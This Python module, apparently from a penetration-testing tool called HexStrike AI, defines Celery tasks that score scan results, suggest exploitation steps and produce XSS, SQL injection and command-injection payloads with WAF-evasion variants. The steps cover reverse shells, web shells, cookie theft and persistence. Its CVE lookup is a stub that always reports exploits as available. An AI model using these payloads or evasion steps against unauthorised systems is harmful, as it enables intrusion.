#!/usr/bin/env python3
"""
HexStrike AI - AI Enhancement Tasks (v6.2)

AI智能化增强任务
"""

import logging
import json
import re
from datetime import datetime
from typing import Dict, Any, List, Optional
from celery import Task

from core.celery_app import celery_app

logger = logging.getLogger(__name__)


# ============================================================================
# BASE AI TASK
# ============================================================================

class BaseAITask(Task):
    """AI任务基类"""
    
    def on_failure(self, exc, task_id, args, kwargs, einfo):
        """任务失败时的回调"""
        logger.error(f"AI task {task_id} failed: {exc}")
    
    def update_progress(self, current, total, message=''):
        """更新任务进度"""
        self.update_state(
            state='PROGRESS',
            meta={
                'current': current,
                'total': total,
                'percent': int((current / total) * 100) if total > 0 else 0,
                'message': message
            }
        )


# ============================================================================
# INTELLIGENT ANALYSIS TASKS
# ============================================================================

@celery_app.task(
    base=BaseAITask,
    bind=True,
    name='core.tasks.ai_tasks.analyze_scan_results',
    max_retries=2
)
def analyze_scan_results(self, scan_results: Dict[str, Any]) -> Dict[str, Any]:
    """
    智能分析扫描结果
    
    使用AI对扫描结果进行深度分析，提取关键信息和建议
    """
    try:
        self.update_progress(0, 100, 'Initializing AI analysis...')
        
        analysis = {
            'task_id': self.request.id,
            'scan_id': scan_results.get('task_id'),
            'timestamp': datetime.now().isoformat(),
            'severity_distribution': {},
            'critical_findings': [],
            'recommendations': [],
            'attack_surface': {},
            'risk_score': 0
        }
        
        # 1. 提取漏洞信息
        self.update_progress(20, 100, 'Extracting vulnerability data...')
        vulnerabilities = scan_results.get('vulnerabilities', [])
        
        # 统计严重程度分布
        severity_count = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        for vuln in vulnerabilities:
            severity = vuln.get('severity', 'info').lower()
            severity_count[severity] = severity_count.get(severity, 0) + 1
        
        analysis['severity_distribution'] = severity_count
        
        # 2. 识别关键发现
        self.update_progress(40, 100, 'Identifying critical findings...')
        for vuln in vulnerabilities:
            if vuln.get('severity', '').lower() in ['critical', 'high']:
                analysis['critical_findings'].append({
                    'title': vuln.get('info', {}).get('name', 'Unknown'),
                    'severity': vuln.get('severity'),
                    'cve': vuln.get('info', {}).get('cve', []),
                    'description': vuln.get('info', {}).get('description', ''),
                    'matched_at': vuln.get('matched-at', ''),
                    'cvss_score': vuln.get('info', {}).get('cvss-score', 0)
                })
        
        # 3. 生成攻击面分析
        self.update_progress(60, 100, 'Analyzing attack surface...')
        analysis['attack_surface'] = analyze_attack_surface(scan_results)
        
        # 4. 计算风险评分
        self.update_progress(80, 100, 'Calculating risk score...')
        risk_score = (
            severity_count['critical'] * 10 +
            severity_count['high'] * 7 +
            severity_count['medium'] * 4 +
            severity_count['low'] * 2 +
            severity_count['info'] * 0.5
        )
        analysis['risk_score'] = min(100, risk_score)
        analysis['risk_level'] = get_risk_level(analysis['risk_score'])
        
        # 5. 生成修复建议
        self.update_progress(90, 100, 'Generating recommendations...')
        analysis['recommendations'] = generate_recommendations(analysis)
        
        self.update_progress(100, 100, 'Analysis completed')
        
        return analysis
        
    except Exception as e:
        logger.error(f"AI analysis failed: {e}")
        raise self.retry(exc=e)


@celery_app.task(
    base=BaseAITask,
    bind=True,
    name='core.tasks.ai_tasks.generate_exploit_suggestions',
    max_retries=2
)
def generate_exploit_suggestions(self, vulnerability_data: Dict[str, Any]) -> Dict[str, Any]:
    """
    基于漏洞数据生成利用建议
    
    使用AI分析漏洞特征，提供可能的利用方法
    """
    try:
        self.update_progress(0, 100, 'Analyzing vulnerability...')
        
        vuln_type = vulnerability_data.get('type', '').lower()
        cves = vulnerability_data.get('cve', [])
        
        suggestions = {
            'task_id': self.request.id,
            'vulnerability': vulnerability_data.get('name'),
            'exploit_paths': [],
            'tools_recommended': [],
            'difficulty': 'unknown',
            'success_probability': 0,
            'timestamp': datetime.now().isoformat()
        }
        
        # 基于漏洞类型生成建议
        self.update_progress(30, 100, 'Generating exploit paths...')
        
        if 'sql' in vuln_type or 'injection' in vuln_type:
            suggestions['exploit_paths'].append({
                'method': 'SQL Injection',
                'steps': [
                    'Identify injection point',
                    'Test with basic payloads (1\' OR \'1\'=\'1)',
                    'Enumerate database structure',
                    'Extract sensitive data',
                    'Escalate to RCE if possible'
                ],
                'tools': ['sqlmap', 'burp suite', 'manual testing']
            })
            suggestions['difficulty'] = 'medium'
            suggestions['success_probability'] = 70
        
        elif 'xss' in vuln_type or 'cross-site' in vuln_type:
            suggestions['exploit_paths'].append({
                'method': 'Cross-Site Scripting (XSS)',
                'steps': [
                    'Confirm XSS with alert() payload',
                    'Bypass WAF/filters if present',
                    'Craft malicious payload',
                    'Execute cookie theft or keylogging',
                    'Escalate to account takeover'
                ],
                'tools': ['dalfox', 'xsser', 'burp suite']
            })
            suggestions['difficulty'] = 'low-medium'
            suggestions['success_probability'] = 80
        
        elif 'rce' in vuln_type or 'remote code' in vuln_type:
            suggestions['exploit_paths'].append({
                'method': 'Remote Code Execution',
                'steps': [
                    'Identify code execution vector',
                    'Test with safe commands (whoami, id)',
                    'Establish reverse shell',
                    'Escalate privileges',
                    'Maintain persistence'
                ],
                'tools': ['metasploit', 'custom exploits', 'nc/netcat']
            })
            suggestions['difficulty'] = 'high'
            suggestions['success_probability'] = 60
        
        elif 'upload' in vuln_type or 'file' in vuln_type:
            suggestions['exploit_paths'].append({
                'method': 'File Upload Exploitation',
                'steps': [
                    'Test upload filters',
                    'Bypass restrictions (double extensions, MIME types)',
                    'Upload web shell',
                    'Access uploaded file',
                    'Execute commands'
                ],
                'tools': ['burp suite', 'custom web shells']
            })
            suggestions['difficulty'] = 'medium'
            suggestions['success_probability'] = 65
        
        # 添加通用工具建议
        self.update_progress(70, 100, 'Recommending tools...')
        suggestions['tools_recommended'] = deduce_tools(vulnerability_data)
        
        # 如果有CVE，添加CVE特定信息
        if cves:
            self.update_progress(90, 100, 'Fetching CVE details...')
            suggestions['cve_info'] = fetch_cve_exploits(cves)
        
        self.update_progress(100, 100, 'Suggestions generated')
        
        return suggestions
        
    except Exception as e:
        logger.error(f"Exploit suggestion generation failed: {e}")
        raise self.retry(exc=e)


@celery_app.task(
    base=BaseAITask,
    bind=True,
    name='core.tasks.ai_tasks.predict_attack_vectors',
    max_retries=2
)
def predict_attack_vectors(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
    """
    预测可能的攻击向量
    
    基于目标信息，使用机器学习模型预测最可能成功的攻击向量
    """
    try:
        self.update_progress(0, 100, 'Analyzing target...')
        
        prediction = {
            'task_id': self.request.id,
            'target': target_info.get('target'),
            'attack_vectors': [],
            'priority_ranking': [],
            'estimated_time': {},
            'timestamp': datetime.now().isoformat()
        }
        
        # 分析目标类型
        target_type = identify_target_type(target_info)
        
        self.update_progress(30, 100, 'Predicting attack vectors...')
        
        # 基于目标类型预测攻击向量
        if target_type == 'web_application':
            vectors = [
                {'vector': 'SQL Injection', 'probability': 0.75, 'priority': 1},
                {'vector': 'XSS', 'probability': 0.80, 'priority': 2},
                {'vector': 'CSRF', 'probability': 0.65, 'priority': 3},
                {'vector': 'Authentication Bypass', 'probability': 0.55, 'priority': 4},
                {'vector': 'File Upload', 'probability': 0.50, 'priority': 5},
            ]
        elif target_type == 'api':
            vectors = [
                {'vector': 'Broken Authentication', 'probability': 0.70, 'priority': 1},
                {'vector': 'Broken Object Level Authorization', 'probability': 0.75, 'priority': 2},
                {'vector': 'Mass Assignment', 'probability': 0.60, 'priority': 3},
                {'vector': 'Rate Limiting Issues', 'probability': 0.65, 'priority': 4},
            ]
        elif target_type == 'network':
            vectors = [
                {'vector': 'Open Ports', 'probability': 0.85, 'priority': 1},
                {'vector': 'Outdated Services', 'probability': 0.70, 'priority': 2},
                {'vector': 'Default Credentials', 'probability': 0.60, 'priority': 3},
                {'vector': 'Weak Encryption', 'probability': 0.55, 'priority': 4},
            ]
        else:
            vectors = []
        
        prediction['attack_vectors'] = vectors
        prediction['priority_ranking'] = sorted(vectors, key=lambda x: x['probability'], reverse=True)
        
        # 估算测试时间
        self.update_progress(70, 100, 'Estimating testing time...')
        for vector in vectors:
            prediction['estimated_time'][vector['vector']] = estimate_testing_time(vector['vector'])
        
        self.update_progress(100, 100, 'Prediction completed')
        
        return prediction
        
    except Exception as e:
        logger.error(f"Attack vector prediction failed: {e}")
        raise self.retry(exc=e)


@celery_app.task(
    base=BaseAITask,
    bind=True,
    name='core.tasks.ai_tasks.generate_intelligent_payloads',
    max_retries=2
)
def generate_intelligent_payloads(self, context: Dict[str, Any]) -> Dict[str, Any]:
    """
    智能生成测试Payload
    
    根据上下文信息（WAF、过滤器等）生成优化的测试载荷
    """
    try:
        self.update_progress(0, 100, 'Analyzing context...')
        
        vuln_type = context.get('vulnerability_type', 'xss')
        waf_detected = context.get('waf_detected', False)
        filters = context.get('filters', [])
        
        payload_set = {
            'task_id': self.request.id,
            'vulnerability_type': vuln_type,
            'payloads': [],
            'evasion_techniques': [],
            'success_probability': {},
            'timestamp': datetime.now().isoformat()
        }
        
        self.update_progress(30, 100, 'Generating payloads...')
        
        # 根据漏洞类型生成payload
        if vuln_type == 'xss':
            base_payloads = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                'javascript:alert(1)',
                '<iframe src="javascript:alert(1)">',
            ]
            
            if waf_detected:
                # WAF绕过payload
                evasion_payloads = [
                    '<script>alert(String.fromCharCode(88,83,83))</script>',
                    '<img/src=x/onerror=alert(1)>',
                    '<svg/onload=alert(1)>',
                    'java\0script:alert(1)',
                    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
                ]
                payload_set['payloads'].extend(evasion_payloads)
                payload_set['evasion_techniques'].append('HTML entity encoding')
                payload_set['evasion_techniques'].append('Null byte injection')
                payload_set['evasion_techniques'].append('Case variation')
            else:
                payload_set['payloads'].extend(base_payloads)
        
        elif vuln_type == 'sqli':
            base_payloads = [
                "' OR '1'='1",
                "1' OR '1'='1' --",
                "admin'--",
                "' UNION SELECT NULL--",
                "1' AND 1=1--",
            ]
            
            if waf_detected:
                evasion_payloads = [
                    "1'/**/OR/**/1=1--",
                    "1' OR 1=1#",
                    "1' OR 'x'='x",
                    "1' AnD 1=1--",
                    "1'||'1'='1",
                ]
                payload_set['payloads'].extend(evasion_payloads)
                payload_set['evasion_techniques'].append('Comment injection')
                payload_set['evasion_techniques'].append('Case variation')
                payload_set['evasion_techniques'].append('String concatenation')
            else:
                payload_set['payloads'].extend(base_payloads)
        
        elif vuln_type == 'rce':
            base_payloads = [
                '; whoami',
                '| whoami',
                '`whoami`',
                '$(whoami)',
                '&& whoami',
            ]
            
            if waf_detected:
                evasion_payloads = [
                    ';who``ami',
                    '|w\\ho\\ami',
                    '`w"ho"ami`',
                    '$(w\\ho\\ami)',
                    '&&who$()ami',
                ]
                payload_set['payloads'].extend(evasion_payloads)
                payload_set['evasion_techniques'].append('Command obfuscation')
                payload_set['evasion_techniques'].append('Quote escaping')
            else:
                payload_set['payloads'].extend(base_payloads)
        
        # 计算成功概率
        self.update_progress(70, 100, 'Calculating success probability...')
        for payload in payload_set['payloads']:
            probability = calculate_payload_probability(payload, context)
            payload_set['success_probability'][payload] = probability
        
        # 按概率排序
        payload_set['payloads'] = sorted(
            payload_set['payloads'],
            key=lambda p: payload_set['success_probability'].get(p, 0),
            reverse=True
        )
        
        self.update_progress(100, 100, 'Payload generation completed')
        
        return payload_set
        
    except Exception as e:
        logger.error(f"Payload generation failed: {e}")
        raise self.retry(exc=e)


# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def analyze_attack_surface(scan_results: Dict[str, Any]) -> Dict[str, Any]:
    """分析攻击面"""
    attack_surface = {
        'open_ports': [],
        'web_services': [],
        'exposed_apis': [],
        'subdomains': [],
        'technologies': []
    }
    
    # 从扫描结果提取信息
    if 'output' in scan_results:
        output = scan_results['output']
        
        # 提取开放端口
        port_pattern = r'(\d+)/tcp\s+open'
        attack_surface['open_ports'] = re.findall(port_pattern, output)
        
        # 提取服务
        service_pattern = r'(\d+)/tcp\s+open\s+(\w+)'
        services = re.findall(service_pattern, output)
        attack_surface['web_services'] = [s[1] for s in services]
    
    return attack_surface


def get_risk_level(score: float) -> str:
    """根据评分获取风险等级"""
    if score >= 80:
        return 'CRITICAL'
    elif score >= 60:
        return 'HIGH'
    elif score >= 40:
        return 'MEDIUM'
    elif score >= 20:
        return 'LOW'
    else:
        return 'INFO'


def generate_recommendations(analysis: Dict[str, Any]) -> List[str]:
    """生成修复建议"""
    recommendations = []
    
    critical_count = analysis['severity_distribution'].get('critical', 0)
    high_count = analysis['severity_distribution'].get('high', 0)
    
    if critical_count > 0:
        recommendations.append(
            f"🚨 Immediate action required: {critical_count} critical vulnerabilities found. "
            "Prioritize patching these issues immediately."
        )
    
    if high_count > 0:
        recommendations.append(
            f"⚠️  High priority: Address {high_count} high-severity vulnerabilities within 7 days."
        )
    
    if analysis['risk_score'] > 70:
        recommendations.append(
            "🔒 Consider implementing a Web Application Firewall (WAF) for immediate protection."
        )
    
    recommendations.append(
        "📋 Implement regular security scanning in your CI/CD pipeline."
    )
    
    recommendations.append(
        "👥 Conduct security awareness training for development team."
    )
    
    return recommendations


def deduce_tools(vulnerability_data: Dict[str, Any]) -> List[str]:
    """推断适用的工具"""
    tools = []
    vuln_type = vulnerability_data.get('type', '').lower()
    
    tool_mapping = {
        'sql': ['sqlmap', 'havij', 'jSQL Injection'],
        'xss': ['dalfox', 'xsser', 'XSStrike'],
        'rce': ['commix', 'metasploit'],
        'upload': ['fuxploider', 'burp suite'],
        'lfi': ['fimap', 'LFISuite'],
        'xxe': ['XXEinjector'],
    }
    
    for key, tool_list in tool_mapping.items():
        if key in vuln_type:
            tools.extend(tool_list)
    
    return tools if tools else ['burp suite', 'manual testing']


def fetch_cve_exploits(cves: List[str]) -> Dict[str, Any]:
    """获取CVE利用信息（模拟）"""
    cve_info = {}
    
    for cve in cves:
        cve_info[cve] = {
            'exploits_available': True,  # 实际应查询exploit-db
            'metasploit_modules': [],    # 实际应查询metasploit
            'references': []              # 实际应查询NVD
        }
    
    return cve_info


def identify_target_type(target_info: Dict[str, Any]) -> str:
    """识别目标类型"""
    url = target_info.get('target', '')
    
    if '/api/' in url or '/v1/' in url or '/v2/' in url:
        return 'api'
    elif 'http' in url:
        return 'web_application'
    else:
        return 'network'


def estimate_testing_time(attack_vector: str) -> str:
    """估算测试时间"""
    time_estimates = {
        'SQL Injection': '30-60 minutes',
        'XSS': '20-40 minutes',
        'CSRF': '15-30 minutes',
        'Authentication Bypass': '45-90 minutes',
        'File Upload': '30-60 minutes',
        'Open Ports': '10-20 minutes',
        'Default Credentials': '15-30 minutes',
    }
    
    return time_estimates.get(attack_vector, '30-60 minutes')


def calculate_payload_probability(payload: str, context: Dict[str, Any]) -> float:
    """计算payload成功概率"""
    base_probability = 0.7
    
    # 如果有WAF，降低概率
    if context.get('waf_detected'):
        base_probability -= 0.3
    
    # 如果payload使用了混淆技术，增加概率
    if '\\' in payload or '``' in payload or '$()' in payload:
        base_probability += 0.15
    
    return min(1.0, max(0.0, base_probability))
